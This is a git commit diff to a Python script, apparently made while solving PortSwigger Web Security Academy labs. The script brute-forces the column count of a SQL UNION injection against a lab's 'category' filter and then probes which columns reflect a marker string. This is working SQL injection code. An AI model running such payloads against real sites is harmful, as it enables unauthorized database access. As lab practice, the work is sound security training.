6d25ea1bf96528701a497afcf2d03d665358426f
ricchi24 <ricchisulis24@gmail.com>
2023-08-07 09:47:26 +0100

    union attack 2

--- SQLI/unionLength.py
+++ SQLI/unionLength.py
@@ -2,14 +2,14 @@
 
 import requests
 
-url = "https://0a2d007d03d9308180bd855400cf006b.web-security-academy.net/filter"
+url = "https://0a4900b2038630e180b694c300c90013.web-security-academy.net/filter"
+rnd = "2dpK5h"
 
 # calculate standard len for query
 st_len = len(requests.get(url, {"category":"test"}).text) 
 
 
 lenght=1
-
 while(1):
     print(f"trying {lenght}")
 
@@ -23,8 +23,21 @@ while(1):
     else:
         break
 
-
 print(f"number of columns is {lenght}")
 
+text = [False for i in range(lenght)]
+
+for i in range(lenght):
+    payload = "NULL,"*i
+    payload += f"'{rnd}',"
+    payload += ("NULL,"*(lenght-i-1))
+    payload = payload[:-1]
+    
+    l = requests.get(url, {"category":"' Union SELECT "+payload+"-- -"}).text
+    l=len(l)
+    if(l>st_len):
+        text[i]=True
+
+print(text)
 
 
